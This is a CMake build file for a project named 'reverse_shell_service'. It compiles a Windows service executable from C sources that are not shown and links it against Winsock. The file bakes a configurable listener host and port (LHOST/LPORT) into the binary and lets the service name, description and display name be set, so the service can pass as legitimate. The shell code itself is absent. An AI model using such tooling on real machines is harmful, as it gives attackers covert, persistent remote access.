cmake_minimum_required(VERSION 3.22)

project(reverse_shell_service LANGUAGES C)

set(SERVER_HOST "localhost" CACHE STRING "LHOST (default: localhost)")
set(SERVER_PORT "1234"      CACHE STRING "LPORT (default: 1234)")
message(STATUS "SERVER_HOST: ${SERVER_HOST}")
message(STATUS "SERVER_PORT: ${SERVER_PORT}")

set(SERVICE_NAME "svcname"      CACHE STRING "Backend name of service (default: svcname)")
set(SERVICE_DESC ""             CACHE STRING "Description of service (default: no description)")
set(DISPLAY_NAME "Service Name" CACHE STRING "Pretty name of service, for UI (default: Service Name)")
message(STATUS "SERVICE_NAME: ${SERVICE_NAME}")
message(STATUS "SERVICE_DESC: ${SERVICE_DESC}")
message(STATUS "DISPLAY_NAME: ${DISPLAY_NAME}")

add_executable(svc main.c service.c shell.c)
set_property(TARGET svc PROPERTY
    MSVC_RUNTIME_LIBRARY "MultiThreaded$<$<CONFIG:Debug>:Debug>"
)
target_compile_options(svc PRIVATE /W4)
target_compile_definitions(svc PUBLIC
    UNICODE
    _UNICODE
    WIN32_LEAN_AND_MEAN
    SERVER_HOST=L"${SERVER_HOST}"
    SERVER_PORT=L"${SERVER_PORT}"
    SERVICE_NAME=L"${SERVICE_NAME}"
    SERVICE_DESC=L"${SERVICE_DESC}"
    DISPLAY_NAME=L"${DISPLAY_NAME}"
)
target_link_libraries(svc PRIVATE Ws2_32)
